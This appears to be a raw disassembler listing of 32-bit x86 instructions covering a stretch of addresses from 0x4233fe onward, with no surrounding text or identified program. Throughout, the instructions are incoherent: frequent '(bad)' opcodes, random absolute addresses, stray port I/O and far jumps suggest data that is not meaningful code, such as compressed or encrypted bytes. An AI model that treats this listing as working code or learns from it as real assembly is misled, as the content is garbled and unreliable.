  4233fe:	retf   0xeecf
  423401:	repnz inc eax
  423403:	out    0xac,al
  423405:	fwait
  423406:	xchg   edx,ebx
  423408:	jle    0x4233c0
  42340a:	mov    edi,DWORD PTR [eax-0x37e0ce2a]
  423410:	xchg   ebp,eax
  423411:	test   BYTE PTR [edi],0x6a
  423414:	push   ecx
  423415:	sbb    esp,ebx
  423417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423418:	cwde   
  423419:	push   edx
  42341a:	repnz add BYTE PTR [ebp+0x22],dh
  42341e:	das    
  42341f:	mul    DWORD PTR [ecx-0x35b2d89]
  423425:	jb     0x4233e3
  423427:	outs   dx,DWORD PTR ds:[esi]
  423428:	pop    ecx
  423429:	ffree  st(3)
  42342b:	jnp    0x4233fd
  42342d:	das    
  42342e:	or     BYTE PTR [ebp+0x7a],al
  423431:	jb     0x4233d2
  423433:	mov    al,ds:0xd8
	...
  423494:	add    BYTE PTR [eax],al
  423496:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42349d:	mov    edi,0xe016fb60
  4234a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234a3:	rol    BYTE PTR [ebp+0x177690d],cl
  4234a9:	add    BYTE PTR [edi],al
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    BYTE PTR [eax+ebx*8],bh
  4234b0:	clc    
  4234b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234b2:	cmp    DWORD PTR ds:0xe527a159,0x5a
  4234b9:	xchg   ebp,eax
  4234ba:	xor    al,0x1
  4234bc:	pop    ecx
  4234bd:	xor    al,BYTE PTR [edx+ebx*4]
  4234c0:	cmp    al,BYTE PTR [ebx-0x7a1845d]
  4234c6:	aas    
  4234c7:	stc    
  4234c8:	test   eax,0xc059e7fc
  4234cd:	pop    esi
  4234ce:	lock mov edx,0x950aa4e8
  4234d4:	push   ds
  4234d5:	cld    
  4234d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234d7:	mov    esi,0x23c800be
  4234dc:	mov    dh,0x5
  4234de:	pushf  
  4234df:	pop    es
  4234e0:	in     eax,dx
  4234e1:	inc    eax
  4234e2:	push   edx
  4234e3:	inc    ebp
  4234e4:	pop    esi
  4234e5:	jl     0x4234a2
  4234e7:	dec    edi
  4234e8:	add    ecx,DWORD PTR [ecx+0x20]
  4234eb:	pop    esp
  4234ec:	mov    ecx,0x49090e2b
  4234f1:	mov    ecx,0x471f02cf
  4234f6:	or     BYTE PTR [esi+0x67d9f4c3],dl
  4234fc:	je     0x4234cb
  4234fe:	or     BYTE PTR [ecx+0x589da732],bh
  423504:	jo     0x4234c2
  423506:	xchg   edi,eax
  423507:	xchg   al,ah
  423509:	scas   al,BYTE PTR es:[edi]
  42350a:	adc    bh,ah
  42350c:	xchg   BYTE PTR [ebx-0x10b47912],bh
  423512:	sbb    esi,esp
  423514:	push   ecx
  423515:	mov    cl,0xc
  423517:	mov    ebx,0x4058dd52
  42351c:	(bad)  
  42351d:	call   FWORD PTR [ecx-0x34]
  423520:	(bad)  
  423521:	mov    edi,0x32efb6e4
  423526:	mov    dh,0x9a
  423528:	sub    ebx,DWORD PTR [eax]
  42352a:	scas   al,BYTE PTR es:[edi]
  42352b:	in     al,dx
  42352c:	loope  0x4234e9
  42352e:	fsubr  DWORD PTR [ebx-0x1d5c84ba]
  423534:	in     eax,dx
  423535:	xchg   ebx,eax
  423536:	add    al,0x24
  423538:	dec    edi
  423539:	jb     0x423516
  42353b:	mov    ?,ebp
  42353d:	enter  0xc2ad,0xb
  423541:	push   0xffffff96
  423543:	dec    esp
  423544:	(bad)  
  423546:	in     eax,0x9d
  423548:	xor    DWORD PTR [ebx+0x19ac9176],ebp
  42354e:	add    dh,dh
  423550:	inc    ebp
  423551:	inc    esp
  423552:	(bad)  
  423553:	and    eax,0x1150e7ef
  423558:	inc    edi
  423559:	dec    ebp
  42355a:	or     edi,DWORD PTR ds:0x59aec520
  423560:	or     BYTE PTR ds:0x60abece6,bl
  423566:	cmp    BYTE PTR [edx-0x526c8e2b],ch
  42356c:	inc    edx
  42356d:	outs   dx,DWORD PTR ds:[esi]
  42356e:	out    0x6a,eax
  423570:	imul   ebp,DWORD PTR [ebp+0x5a9d517e],0x7f2795bc
  42357a:	dec    DWORD PTR [ecx-0x3d6d6b29]
  423580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423581:	repz inc esi
  423583:	push   eax
  423584:	lea    edx,[eax+ecx*4+0x66de993]
  42358b:	jno    0x42351c
  42358d:	das    
  42358e:	mov    WORD PTR [ecx],gs
  423590:	mov    esp,0xf69eca15
  423595:	rcr    bl,0x42
  423598:	mov    ds:0x1109cdf1,eax
  42359d:	fist   DWORD PTR [edi-0x25]
  4235a0:	xor    eax,0x4f4d1a82
  4235a5:	adc    esp,edi
  4235a7:	ret    
  4235a8:	test   BYTE PTR [edi+0x3ab66b8c],bh
  4235ae:	rcl    BYTE PTR [ebp-0x38],0xc3
  4235b2:	lahf   
  4235b3:	add    dh,bl
	...
  423615:	add    BYTE PTR [eax+0x7f747c8f],al
  42361b:	test   DWORD PTR [eax+0x6a2d48ff],0x5f84d8da
  423625:	push   ss
  423626:	jo     0x4236a0
  423628:	add    DWORD PTR [eax],eax
  42362a:	pop    es
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    ch,dl
  42362f:	sbb    edx,ebp
  423631:	jmp    0x1c57cf81
  423636:	mov    edi,0x375c0c9a
  42363b:	aam    0xd3
  42363d:	ficom  WORD PTR [ebp-0x2ff3c8b6]
  423643:	inc    ebp
  423644:	and    cl,BYTE PTR [edi+ebx*4-0x23e983e]
  42364b:	imul   esp,DWORD PTR [edi-0x2bf505e9],0x4d
  423652:	(bad)  
  423654:	cmp    dh,BYTE PTR [ebp+0x1e]
  423657:	popf   
  423658:	xchg   esi,eax
  423659:	pusha  
  42365a:	retf   0xe491
  42365d:	xor    eax,0xf6955eba
  423662:	jae    0x423611
  423664:	in     eax,0xa5
  423666:	jnp    0x4236bb
  423668:	(bad)  
  423669:	int3   
  42366a:	test   al,0x24
  42366c:	mov    esp,0x952b0c4b
  423671:	cs (bad) 
  423673:	adc    DWORD PTR [si],edi
  423676:	(bad)  
  423677:	nop
  423678:	xchg   esp,eax
  423679:	mov    bl,0x50
  42367b:	mov    ch,0xab
  42367d:	mov    esp,0x225d277e
  423682:	sub    bh,dh
  423684:	mov    ds:0xbee87058,eax
  423689:	pop    esp
  42368a:	xchg   edx,eax
  42368b:	sbb    eax,0x7790e0a6
  423690:	scas   eax,DWORD PTR es:[edi]
  423691:	pop    esi
  423692:	adc    DWORD PTR [ebx],edx
  423694:	push   0x47
  423696:	mov    dh,ah
  423698:	sar    edi,1
  42369a:	and    eax,DWORD PTR [esi]
  42369c:	pop    es
  42369d:	mov    dh,0xca
  42369f:	pop    eax
  4236a0:	jno    0x4236f2
  4236a2:	sub    al,BYTE PTR [eax+0x5755b50a]
  4236a8:	test   al,0xb9
  4236aa:	and    DWORD PTR [ecx-0x4d],0xffffffba
  4236ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236af:	sbb    dh,cl
  4236b1:	pop    esi
  4236b2:	dec    ebp
  4236b3:	or     ah,dl
  4236b5:	pusha  
  4236b6:	fnstenv ds:0x2516c2ed
  4236bc:	es dec esp
  4236be:	adc    BYTE PTR [ecx+0x15],0x39
  4236c2:	pop    bx
  4236c4:	int    0x89
  4236c6:	jne    0x423744
  4236c8:	jge    0x423673
  4236ca:	add    bh,cl
  4236cc:	inc    eax
  4236cd:	outs   dx,BYTE PTR ds:[esi]
  4236ce:	xor    BYTE PTR ds:0x6cef24ce,ch
  4236d4:	test   al,0x1f
  4236d6:	shl    DWORD PTR [ebp+0x1c],1
  4236d9:	setb   cl
  4236dc:	retf   
  4236dd:	mov    ebp,0x7e97ba9e
  4236e2:	jecxz  0x4236ad
  4236e4:	mov    ecx,DWORD PTR [esi-0x25]
  4236e7:	add    BYTE PTR [edx-0x55],al
  4236ea:	loop   0x423708
  4236ec:	cld    
  4236ed:	mov    ebx,0x468da4dd
  4236f2:	in     eax,0x45
  4236f4:	add    BYTE PTR [esi],dh
  4236f6:	sub    eax,0xaff57335
  4236fb:	les    eax,FWORD PTR [eax-0x34028bed]
  423701:	sbb    esp,DWORD PTR [edi+0x7cec0d59]
  423707:	bound  edi,QWORD PTR [edx-0x47]
  42370a:	push   esp
  42370b:	pop    esi
  42370c:	lods   al,BYTE PTR ds:[esi]
  42370d:	imul   cx,WORD PTR [edi],0xb8e7
  423712:	ins    BYTE PTR es:[edi],dx
  423713:	pusha  
  423714:	mov    BYTE PTR [edx*1-0x76bb68c4],cl
  42371b:	mov    dl,0xf7
  42371d:	aam    0xda
  42371f:	int3   
  423720:	fwait
  423721:	jg     0x423717
  423723:	mov    ds:0xd9775bd2,al
  423728:	aam    0x2e
  42372a:	in     al,dx
  42372b:	adc    BYTE PTR [eax-0x7bdee6ed],dl
  423731:	or     DWORD PTR [ebp+0xf],ebx
  423734:	jb     0x423736
	...
  423796:	xor    al,0x23
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0x6706c398
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    al,bh
  4237af:	(bad)  
  4237b0:	call   0x4203:0xd16a1181
  4237b7:	xchg   esp,eax
  4237b8:	fisub  WORD PTR [ebx]
  4237ba:	xchg   ebp,eax
  4237bb:	xchg   BYTE PTR [edi+0x71],ch
  4237be:	popa   
  4237bf:	imul   eax,DWORD PTR [eax+0x4d],0x36
  4237c3:	mov    bl,0xae
  4237c5:	dec    eax
  4237c6:	add    al,0x81
  4237c8:	out    0x85,al
  4237ca:	inc    edx
  4237cb:	fsubr  DWORD PTR [eax+0xe]
  4237ce:	test   BYTE PTR [edx+0x1a9e12e5],bh
  4237d4:	int3   
  4237d5:	jle    0x42375f
  4237d7:	cs adc ch,ah
  4237da:	and    al,0xf
  4237dc:	sti    
  4237dd:	inc    esi
  4237de:	je     0x423811
  4237e0:	mov    BYTE PTR [edx+0x15],al
  4237e3:	lock mov al,0x62
  4237e6:	(bad)  
  4237e8:	push   ebx
  4237e9:	cmp    eax,0xfe8e7bc9
  4237ee:	cmp    bh,BYTE PTR [ecx+ebp*2+0x21fe399a]
  4237f5:	mov    BYTE PTR [eax+0x63],dh
  4237f8:	(bad)  
  4237fa:	pusha  
  4237fb:	sub    eax,0x23dc589d
  423800:	fdiv   DWORD PTR [ecx+0x1e]
  423803:	fistp  DWORD PTR [edx+0x5e]
  423806:	inc    esp
  423807:	and    eax,0xe7c56e0a
  42380c:	ret    
  42380d:	inc    ebx
  42380e:	cmp    BYTE PTR [edx-0x57e2c50e],0xbd
  423815:	push   edx
  423816:	rcr    BYTE PTR [ebx+0x260ee85c],0xc1
  42381d:	sbb    eax,0xad217398
  423822:	dec    edi
  423823:	ins    DWORD PTR es:[edi],dx
  423824:	loop   0x4237bc
  423826:	popa   
  423827:	pop    ds
  423828:	out    0x57,al
  42382a:	cmp    dh,dl
  42382c:	in     al,dx
  42382d:	cmc    
  42382e:	fstp   TBYTE PTR [ebx+esi*2]
  423831:	imul   esp,DWORD PTR [ecx+ecx*1-0x13],0x40
  423836:	daa    
  423837:	test   DWORD PTR [eax+edi*4-0x3c50d870],eax
  42383e:	pop    ebx
  42383f:	(bad)  
  423840:	jmp    0xa4c7:0x85ef2381
  423847:	int    0xce
  423849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42384a:	stc    
  42384b:	jae    0x423883
  42384d:	pop    DWORD PTR [ebp-0x57f847e]
  423853:	popf   
  423854:	dec    edi
  423855:	inc    ecx
  423856:	fld    TBYTE PTR [eax+0x74]
  423859:	xor    ebx,DWORD PTR [esi+0x34]
  42385c:	jp     0x4237de
  42385e:	dec    edi
  42385f:	paddb  mm1,QWORD PTR [eax+ebx*4+0x7133ae7b]
  423867:	cld    
  423868:	les    ebp,FWORD PTR [edi+0x2]
  42386b:	push   es
  42386c:	xchg   esp,ecx
  42386e:	aam    0x73
  423870:	inc    ebp
  423871:	dec    ebp
  423872:	test   al,0xc4
  423874:	jns    0x423842
  423876:	pop    esp
  423877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423878:	int3   
  423879:	rol    DWORD PTR [edx-0x5c],1
  42387c:	call   0x795165c9
  423881:	mov    ecx,DWORD PTR [edi-0x890d011]
  423887:	push   ebp
  423888:	and    ebp,DWORD PTR [edx+0x59]
  42388b:	push   eax
  42388c:	and    al,ah
  42388e:	mov    edx,0x826699ad
  423893:	xchg   ecx,eax
  423894:	cmp    eax,0x68c2eac9
  423899:	dec    edx
  42389a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42389b:	pop    eax
  42389c:	sbb    al,0x60
  42389e:	inc    edi
  42389f:	adc    DWORD PTR [ebp-0x13],ecx
  4238a2:	std    
  4238a3:	fiadd  WORD PTR [eax]
  4238a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238a6:	pusha  
  4238a7:	jne    0x42384a
  4238a9:	outs   dx,BYTE PTR ds:[esi]
  4238aa:	repz frstor [ebx+eiz*1-0x5f]
  4238af:	call   0xc7:0x25fabbcd
	...
  423916:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    DWORD PTR [eax],edi
  423923:	add    eax,0x7a7e82d9
  423928:	add    DWORD PTR [eax],eax
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    al,dl
  42392f:	hlt    
  423930:	cwde   
  423931:	scas   al,BYTE PTR es:[edi]
  423932:	inc    ebx
  423933:	repnz mov bh,0xb
  423936:	add    BYTE PTR [edi+ebp*1+0x9300bf],cl
  42393d:	inc    edx
  42393e:	xchg   DWORD PTR [ecx+0x4907888f],ebp
  423944:	lahf   
  423945:	jg     0x423972
  423947:	cld    
  423948:	scas   al,BYTE PTR es:[edi]
  423949:	les    esp,FWORD PTR ds:0x780247c5
  42394f:	int    0x4f
  423951:	sbb    al,0xf8
  423953:	xor    DWORD PTR gs:[edi],0x5b
  423957:	sahf   
  423958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423959:	xlat   BYTE PTR ds:[ebx]
  42395a:	jecxz  0x423902
  42395c:	shr    cl,cl
  42395e:	lahf   
  42395f:	cs mov edi,0xa5063b1a
  423965:	repz int 0x34
  423968:	imul   ecx,DWORD PTR [ecx-0x24f0c36a],0xbf4aa187
  423972:	cmp    DWORD PTR [ebx-0x34],esi
  423975:	sub    bl,BYTE PTR [ebp+0x2b]
  423978:	shr    DWORD PTR [edx+0x17],0xc0
  42397c:	push   eax
  42397d:	cmp    ah,BYTE PTR [ecx]
  42397f:	dec    ebx
  423980:	test   DWORD PTR [edx],esp
  423982:	fs sar bh,1
  423985:	js     0x423940
  423987:	push   edi
  423988:	retf   0xe958
  42398b:	das    
  42398c:	cs sar eax,0x8b
  423990:	(bad)  [esi-0x79dbde7d]
  423996:	fstp   TBYTE PTR [edi]
  423998:	sbb    al,0x1b
  42399a:	push   ecx
  42399b:	sbb    ebp,DWORD PTR [ebx-0xcb5f62a]
  4239a1:	push   es
  4239a2:	sub    dl,BYTE PTR ds:0x13568ffd
  4239a8:	js     0x4239cd
  4239aa:	je     0x423a29
  4239ac:	sub    ecx,esp
  4239ae:	adc    al,0xf4
  4239b0:	inc    esi
  4239b1:	mov    ds:0x19b30573,al
  4239b6:	add    bl,BYTE PTR [edi-0x2204b7f8]
  4239bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239bd:	fdivr  QWORD PTR [esi]
  4239bf:	rcr    BYTE PTR [ecx],cl
  4239c1:	sub    ch,BYTE PTR [esi]
  4239c3:	outs   dx,DWORD PTR ds:[esi]
  4239c4:	dec    ebx
  4239c5:	mov    WORD PTR [eax],cs
  4239c7:	jnp    0x42397e
  4239c9:	add    eax,0x6b0b2898
  4239ce:	ins    DWORD PTR es:[edi],dx
  4239cf:	add    ebp,0x57ac4278
  4239d5:	or     ah,dl
  4239d7:	fsub   st(0),st
  4239d9:	popf   
  4239da:	xor    ebp,DWORD PTR [ecx]
  4239dc:	retf   
  4239dd:	enter  0x70db,0x18
  4239e1:	adc    al,0xd2
  4239e3:	add    al,0x2a
  4239e5:	(bad)  
  4239e6:	xor    ecx,DWORD PTR [edx+0x41]
  4239e9:	imul   ecx,DWORD PTR [ebp-0x676ea81c],0xfffffffd
  4239f0:	packsswb mm2,QWORD PTR [edx]
  4239f3:	cwde   
  4239f4:	ds jecxz 0x4239b5
  4239f7:	jns    0x4239ab
  4239f9:	ins    DWORD PTR es:[edi],dx
  4239fa:	sub    cl,BYTE PTR [edx-0x571d6f96]
  423a00:	fldenv [esp+edx*1+0x355f053c]
  423a07:	add    eax,DWORD PTR [esi-0x16]
  423a0a:	jl     0x423a15
  423a0c:	pop    ecx
  423a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a0e:	icebp  
  423a0f:	(bad)  
  423a10:	cli    
  423a11:	adc    DWORD PTR [edx+0x3a],eax
  423a14:	(bad)  
  423a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a16:	cmp    dh,BYTE PTR [ecx+0x37f54b0d]
  423a1c:	mov    dl,BYTE PTR ds:[ebx]
  423a1f:	inc    ecx
  423a20:	adc    eax,0x324734b4
  423a25:	in     eax,dx
  423a26:	test   al,0xa4
  423a28:	add    DWORD PTR [edi-0x6a9c0503],ebp
  423a2e:	retf   
  423a2f:	jp     0x423a4c
  423a31:	cmp    ebp,DWORD PTR [edi+0x36ce]
	...
  423a93:	add    BYTE PTR [eax],al
  423a95:	add    BYTE PTR [eax],dh
  423a97:	cmp    eax,0xdf7d9f75
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423aa3:	pusha  
  423aa4:	bswap  esp
  423aa6:	test   DWORD PTR [ebx+0x1],edi
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [edi-0x2799e2c6],dl
  423ab3:	stos   BYTE PTR es:[edi],al
  423ab4:	pop    esp
  423ab5:	xchg   edx,eax
  423ab6:	xchg   edx,eax
  423ab7:	jae    0x423a45
  423ab9:	dec    ebp
  423aba:	mov    ds:0xbfa96e7c,eax
  423abf:	jmp    0x53e57589
  423ac4:	jmp    0x43971aa0
  423ac9:	cmp    eax,0x8bc30c11
  423ace:	jg     0x423b2c
  423ad0:	dec    edi
  423ad1:	and    al,0x41
  423ad3:	aas    
  423ad4:	push   ss
  423ad5:	test   eax,0x96ea2e9b
  423ada:	push   ebx
  423adb:	es es (bad) 
  423ade:	xor    DWORD PTR [edi+0x3b8003e5],ebp
  423ae4:	shl    eax,1
  423ae6:	mov    edx,DWORD PTR [edx+eiz*1]
  423ae9:	xchg   edx,eax
  423aea:	sbb    cl,BYTE PTR [ebx-0x2a]
  423aed:	(bad)  
  423aee:	mul    BYTE PTR [edx+0x56250fb6]
  423af4:	std    
  423af5:	stos   BYTE PTR es:[edi],al
  423af6:	test   ah,cl
  423af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423af9:	shr    BYTE PTR ds:0xf53324ce,1
  423aff:	jb     0x423b5d
  423b01:	repz mov al,ds:0xa76ef4c
  423b07:	out    dx,eax
  423b08:	cmp    al,0x8b
  423b0a:	(bad)  
  423b0b:	mov    eax,0xbd4db515
  423b10:	mov    ebp,0xfc1c313d
  423b15:	dec    esi
  423b16:	xchg   DWORD PTR [esi-0x24c68d0f],esp
  423b1c:	hlt    
  423b1d:	inc    esi
  423b1e:	out    dx,eax
  423b1f:	hlt    
  423b20:	es mov esp,0x361f7932
  423b26:	push   ss
  423b27:	lds    esp,FWORD PTR [esi]
  423b29:	push   esi
  423b2a:	push   0x40
  423b2c:	mov    esi,esp
  423b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b2f:	es jecxz 0x423b46
  423b32:	outs   dx,DWORD PTR ds:[esi]
  423b33:	jo     0x423b24
  423b35:	shr    BYTE PTR [edi+0x704c19ca],1
  423b3b:	xchg   esi,eax
  423b3c:	loop   0x423b16
  423b3e:	int3   
  423b3f:	jle    0x423ba3
  423b41:	sbb    DWORD PTR [ecx],edi
  423b43:	xor    ah,ch
  423b45:	les    esp,FWORD PTR [edi+0x18]
  423b48:	cli    
  423b49:	adc    al,al
  423b4b:	jl     0x423b15
  423b4d:	jb     0x423acf
  423b4f:	jne    0x423ae2
  423b51:	sub    ebp,ecx
  423b53:	push   ss
  423b54:	arpl   WORD PTR [edi+ecx*8],cx
  423b57:	mov    ebp,DWORD PTR [esi+ebx*4-0x60]
  423b5b:	xchg   esp,eax
  423b5c:	std    
  423b5d:	leave  
  423b5e:	popa   
  423b5f:	daa    
  423b60:	fwait
  423b61:	xchg   ebx,eax
  423b62:	cmp    al,0xf7
  423b64:	jbe    0x423b8d
  423b66:	sub    eax,0xa076312c
  423b6b:	xor    BYTE PTR [eax+ebx*4-0x49b475e7],ah
  423b72:	ror    DWORD PTR ds:0x672601ea,0xcd
  423b79:	inc    esp
  423b7a:	and    BYTE PTR [ebx+0x7671dcb9],bl
  423b80:	mov    esp,0xcd76d947
  423b85:	xor    dh,0x1
  423b88:	sbb    DWORD PTR [ecx-0x53],0x50
  423b8c:	enter  0x5a45,0xe5
  423b90:	imul   eax,DWORD PTR [ecx+0x67f79579],0xa519e1bd
  423b9a:	data16 (bad) 
  423b9c:	jp     0x423bd2
  423b9e:	mov    esi,0xb09da94e
  423ba3:	test   al,0x46
  423ba5:	inc    ecx
  423ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba7:	fstp   TBYTE PTR [edi]
  423ba9:	dec    edi
  423baa:	stos   BYTE PTR es:[edi],al
  423bab:	mov    edi,0x4c239f84
  423bb0:	out    0x14,al
  423bb2:	inc    edi
  423bb3:	mov    edx,0x4b
	...
  423c14:	add    BYTE PTR [eax],al
  423c16:	std    
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	lea    edx,[edx]
  423c24:	jmp    0x423c53
  423c26:	mov    WORD PTR [ecx+eax*1+0x0],?
  423c2a:	pop    es
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    BYTE PTR [esi+0x5],cl
  423c30:	mov    ds:0x6a198a28,eax
  423c35:	rcl    DWORD PTR [ecx-0x8eb0425],cl
  423c3b:	into   
  423c3c:	aad    0x98
  423c3e:	push   esi
  423c3f:	inc    esi
  423c40:	dec    ecx
  423c41:	ins    BYTE PTR es:[edi],dx
  423c42:	enter  0x2b17,0xf7
  423c46:	push   0x847c31b0
  423c4b:	mov    ds:0x921ae6e6,eax
  423c50:	test   eax,0x1e1a2df4
  423c55:	jg     0x423c6c
  423c57:	(bad)  
  423c58:	int3   
  423c59:	jmp    0x11d2:0xe2e3c4b6
  423c60:	dec    edx
  423c61:	test   eax,0x22d8f521
  423c66:	loopne 0x423c9d
  423c68:	xchg   ebx,eax
  423c69:	pop    ds
  423c6a:	frstor [ebx]
  423c6c:	mov    ebx,0xbd66559d
  423c71:	and    DWORD PTR [eax+0x54],edx
  423c74:	(bad)  
  423c75:	mov    al,ds:0x7f2e151f
  423c7a:	mov    ebp,0x14e17d82
  423c7f:	popa   
  423c80:	mov    bl,bh
  423c82:	add    dh,BYTE PTR [ecx-0x3b]
  423c85:	(bad)  [ebp-0x7d]
  423c88:	sub    DWORD PTR [ebx+ebp*2+0x2c],0xffffffbd
  423c8d:	or     BYTE PTR [ebx-0x2bfface9],bl
  423c93:	jmp    0x423c80
  423c95:	mov    edi,0x744a865f
  423c9a:	cmc    
  423c9b:	xchg   BYTE PTR [ebx],dl
  423c9d:	fsubr  QWORD PTR [esi]
  423c9f:	inc    edx
  423ca0:	rcl    bl,1
  423ca2:	dec    esp
  423ca3:	xchg   ecx,eax
  423ca4:	bound  esp,QWORD PTR [ebx]
  423ca6:	stos   DWORD PTR es:[edi],eax
  423ca7:	repnz shl DWORD PTR ds:0xb7b77574,1
  423cae:	cdq    
  423caf:	popa   
  423cb0:	xor    eax,0xf0297c88
  423cb5:	jns    0x423ca6
  423cb7:	fcom   st(5)
  423cb9:	push   ebx
  423cba:	jge    0x423d15
  423cbc:	(bad)  
  423cbe:	mul    BYTE PTR [ecx+0x2f28dec4]
  423cc4:	cmp    esi,DWORD PTR [ebx+eax*1-0x1b]
  423cc8:	add    esp,DWORD PTR [ebp+0x55]
  423ccb:	sub    eax,0x6844ef1c
  423cd0:	mov    dl,0x7c
  423cd2:	push   esi
  423cd3:	fwait
  423cd4:	daa    
  423cd5:	repnz lock xchg ebp,eax
  423cd8:	stc    
  423cd9:	outs   dx,DWORD PTR ds:[esi]
  423cda:	js     0x423cce
  423cdc:	nop
  423cdd:	call   0xdbe3:0x1c0c27a0
  423ce4:	add    ecx,eax
  423ce6:	add    al,BYTE PTR [edi+ecx*8+0x0]
  423cea:	add    BYTE PTR [esp+eax*4+0x7daa6fa9],dl
  423cf1:	dec    ebx
  423cf2:	or     al,0xe
  423cf4:	not    DWORD PTR [esi]
  423cf6:	cdq    
  423cf7:	adc    dh,dh
  423cf9:	lahf   
  423cfa:	out    dx,al
  423cfb:	je     0x423d1a
  423cfd:	mov    BYTE PTR [ebx+0x30207833],cl
  423d03:	push   ds
  423d04:	cmp    BYTE PTR [edx+0x10],bl
  423d07:	push   ebx
  423d08:	add    al,0x78
  423d0a:	imul   DWORD PTR [ebx]
  423d0c:	dec    ebx
  423d0d:	arpl   ax,bx
  423d0f:	jecxz  0x423cc6
  423d11:	mov    cl,0xb0
  423d13:	lods   eax,DWORD PTR ds:[esi]
  423d14:	aam    0xf8
  423d16:	mov    dh,BYTE PTR [ebx+0x1c]
  423d19:	mov    ebx,0x2d2216b3
  423d1e:	mov    esi,0x5ea10aee
  423d23:	out    0x1e,eax
  423d25:	out    dx,al
  423d26:	(bad)  
  423d27:	stc    
  423d28:	xchg   edi,eax
  423d29:	adc    eax,0x49296041
  423d2e:	cmp    bh,ch
  423d30:	push   edx
  423d31:	push   ebp
  423d32:	js     0x423d0d
  423d34:	loopne 0x423d36
	...
  423d96:	(bad)  
  423d97:	test   BYTE PTR [edi-0x118668f7],0xff
  423d9e:	iret   
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	pop    ss
  423da3:	lods   eax,DWORD PTR ds:[esi]
  423da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da5:	xchg   ebp,eax
  423da6:	xchg   ebx,eax
  423da7:	jge    0x423daa
  423da9:	add    BYTE PTR [edi],al
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    dh,al
  423daf:	ins    DWORD PTR es:[edi],dx
  423db0:	cmp    edi,DWORD PTR [eax-0x20f19a89]
  423db6:	arpl   WORD PTR [ebp-0x57],cx
  423db9:	dec    esp
  423dba:	les    ebx,FWORD PTR [edi-0x571af358]
  423dc0:	adc    dl,BYTE PTR [esi+0x7a]
  423dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dc4:	sbb    eax,DWORD PTR [ecx+0x72b4091]
  423dca:	pop    esp
  423dcb:	popf   
  423dcc:	mov    ebp,0xb2fdf682
  423dd1:	jne    0x423d87
  423dd3:	jns    0x423e46
  423dd5:	cmp    al,0xe8
  423dd7:	pop    ecx
  423dd8:	idiv   DWORD PTR [esi]
  423dda:	(bad)  
  423ddb:	in     al,0x1d
  423ddd:	dec    eax
  423dde:	add    BYTE PTR [esi+esi*8-0x6a],0xd9
  423de3:	xchg   ecx,eax
  423de4:	popa   
  423de5:	pop    ds
  423de6:	sbb    al,0x14
  423de8:	cmp    ebp,ebx
  423dea:	cmp    DWORD PTR [ebx],esi
  423dec:	adc    al,0xad
  423dee:	pushf  
  423def:	test   dl,bl
  423df1:	and    al,0xb5
  423df3:	push   0x4234b607
  423df8:	in     eax,dx
  423df9:	jns    0x423dc7
  423dfb:	ja     0x423d89
  423dfd:	imul   esi,DWORD PTR [ecx-0x17],0x9bae36ca
  423e04:	pop    esp
  423e06:	adc    cl,BYTE PTR [eax+0x5fbb1ac8]
  423e0c:	add    DWORD PTR [edi-0x80],ecx
  423e0f:	ds test eax,0xb20ab17f
  423e15:	adc    al,0x2b
  423e17:	add    DWORD PTR [edx-0x35],esi
  423e1a:	mov    WORD PTR [ecx+0x51aeeff3],gs
  423e20:	add    ch,BYTE PTR [eax-0x1bb6e1c2]
  423e26:	or     DWORD PTR [esi],edi
  423e28:	inc    edi
  423e29:	icebp  
  423e2a:	adc    BYTE PTR [eax+0x7e],cl
  423e2d:	mov    WORD PTR [edx-0x67],cs
  423e30:	adc    al,0x10
  423e32:	xchg   ebx,eax
  423e33:	int3   
  423e34:	cmp    DWORD PTR [ecx],0x8541aebd
  423e3a:	leave  
  423e3b:	clc    
  423e3c:	es push 0xbfa7f380
  423e42:	(bad)  
  423e43:	push   ds
  423e44:	stos   DWORD PTR es:[edi],eax
  423e45:	shr    DWORD PTR [ebx-0x25],1
